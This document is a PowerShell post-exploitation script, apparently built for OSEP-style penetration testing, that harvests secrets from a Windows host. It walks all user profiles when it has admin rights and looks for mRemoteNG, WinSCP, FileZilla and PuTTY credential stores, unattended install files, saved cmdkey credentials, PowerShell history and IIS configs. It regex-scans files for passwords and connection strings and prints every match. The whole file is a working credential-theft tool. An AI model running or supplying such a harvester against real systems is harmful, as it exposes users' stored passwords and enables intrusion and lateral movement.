<# PathMaster Module: Secrets Harvester (Exact Mirror of Master) #>

function Invoke-DeepSecretParser {
    param([string]$Content, [string]$Source)
    $Patterns = @{
        "OSEP Secret/Password" = "(?i)(password|passwd|pwd|secret|key|login|cred|connect)[\s:=]+['""]?([a-zA-Z0-9!@#$%^&*()_+={}\[\]|\\:;<>,.?/~`-]{6,})['""]?"
        "Database Connection" = "(?i)(Data Source|Server|User ID|Initial Catalog|Password|Pwd)=[^;]+"
        "JDBC/Connection"     = "(jdbc|mysql|postgresql|mongodb|oracle|sqlserver)://[a-zA-Z0-9_]+:[^@]+@[a-zA-Z0-9.-]+"
        "VNC/RDP/SSH Creds"   = "(?i)(vnc|rdp|ssh|ftp)[\s:=]+[^ ]*"
    }

    foreach ($Name in $Patterns.Keys) {
        if ($Content -match $Patterns[$Name]) {
            Write-Host "    [!] $Name found in $Source" -ForegroundColor Red
            Write-Host "        Match: $($Matches[0].Trim())" -ForegroundColor Gray
        }
    }
}

function Get-OSEPContextualSecrets {
    param($Profile, $UserName)
    
    # 1. Common OSEP Service Artifacts
    $ServicePaths = @{
        "mRemoteNG" = "AppData\Roaming\mRemoteNG\confCons.xml"
        "WinSCP"    = "AppData\Roaming\WinSCP.ini"
        "FileZilla" = "AppData\Roaming\FileZilla\sitemanager.xml"
        "PuTTY"     = "Software\SimonTatham\PuTTY\Sessions" # Registry path
        "StickyNotes" = "AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite"
    }

    foreach ($Name in $ServicePaths.Keys) {
        $Path = Join-Path $Profile $ServicePaths[$Name]
        if (Test-Path $Path) {
            Write-Host "[!] $Name Artifact Found for ${UserName}: $Path" -ForegroundColor Red
            if ($Name -eq "mRemoteNG") { Write-Host "    Action: Decrypt XML using mRemoteNG-Decrypt or similar" -ForegroundColor Gray }
        }
    }

    # 2. Unattended & Deployment Files
    $UnattendPaths = @(
        "C:\Windows\Panther\Unattend.xml",
        "C:\Windows\Panther\Unattended.xml",
        "C:\Windows\System32\Sysprep\unattend.xml",
        "C:\Windows\System32\Sysprep\Panther\unattend.xml"
    )
    foreach ($Path in $UnattendPaths) {
        if (Test-Path $Path) {
            Write-Host "[!] UNATTENDED INSTALL FILE: $Path" -ForegroundColor Red
            $Content = Get-Content $Path -ErrorAction SilentlyContinue
            if ($Content -match "Password") { Write-Host "    Action: Check for <Password> tags in XML" -ForegroundColor Yellow }
        }
    }

    # 3. RDP & Saved Credentials
    if ($Profile -eq $env:USERPROFILE) {
        $SavedCreds = cmdkey /list | Select-String "Target:" -ErrorAction SilentlyContinue
        if ($SavedCreds) {
            Write-Host "[*] Saved Credentials Found (cmdkey):" -ForegroundColor Yellow
            $SavedCreds | ForEach-Object { Write-Host "    -> $($_.ToString().Trim())" -ForegroundColor Gray }
        }
    }
}

Write-Host "=== OSEP SECRETS HARVESTER (MASTER CLONE) ===" -ForegroundColor Cyan
$IsAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
$TargetProfiles = if ($IsAdmin) { Get-ChildItem "C:\Users" -Directory -ErrorAction SilentlyContinue | Select-Object -ExpandProperty FullName } else { @($env:USERPROFILE) }

foreach ($Profile in $TargetProfiles) {
    if ($Profile -match "Public|Default|All Users") { continue }
    $UserName = Split-Path $Profile -Leaf
    Write-Host "`n[*] Analyzing Profile: $UserName" -ForegroundColor Yellow
    
    # OSEP Artifacts (mRemoteNG, WinSCP, etc.)
    Get-OSEPContextualSecrets -Profile $Profile -UserName $UserName
    
    # PowerShell History & Profiles
    $HistoryPaths = @(
        "AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt",
        "Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1",
        ".ssh\known_hosts"
    )
    foreach ($RelPath in $HistoryPaths) {
        $FullPath = Join-Path $Profile $RelPath
        if (Test-Path $FullPath) {
            Write-Host "[*] Checking: $RelPath" -ForegroundColor Gray
            Get-Content $FullPath -ErrorAction SilentlyContinue | ForEach-Object { Invoke-DeepSecretParser -Content $_ -Source $RelPath }
        }
    }

    # Targeted Credential Search
    foreach ($Sub in @("Documents", "Downloads", "Desktop", "AppData\Local\Temp")) {
        $Path = Join-Path $Profile $Sub
        if (Test-Path $Path) {
            Get-ChildItem -Path $Path -Include "*.config","*.xml","*.ps1","*.txt","*.db","*.sqlite","*.sql" -Recurse -Depth 2 -ErrorAction SilentlyContinue | ForEach-Object {
                if ($_.Extension -match "db|sqlite") { Write-Host "    [*] Database found: $($_.Name)" -ForegroundColor Gray }
                else {
                    $Content = Get-Content $_.FullName -ErrorAction SilentlyContinue
                    Invoke-DeepSecretParser -Content $Content -Source $_.Name
                }
            }
        }
    }
}

# IIS & Shared Services
if (Test-Path "C:\inetpub\wwwroot") {
    Write-Host "`n[*] Checking IIS Infrastructure:" -ForegroundColor Cyan
    Get-ChildItem "C:\inetpub\wwwroot" -Include "web.config","*.php","*.asp","*.aspx" -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
        $Content = Get-Content $_.FullName -ErrorAction SilentlyContinue
        Invoke-DeepSecretParser -Content $Content -Source $_.FullName
    }
}
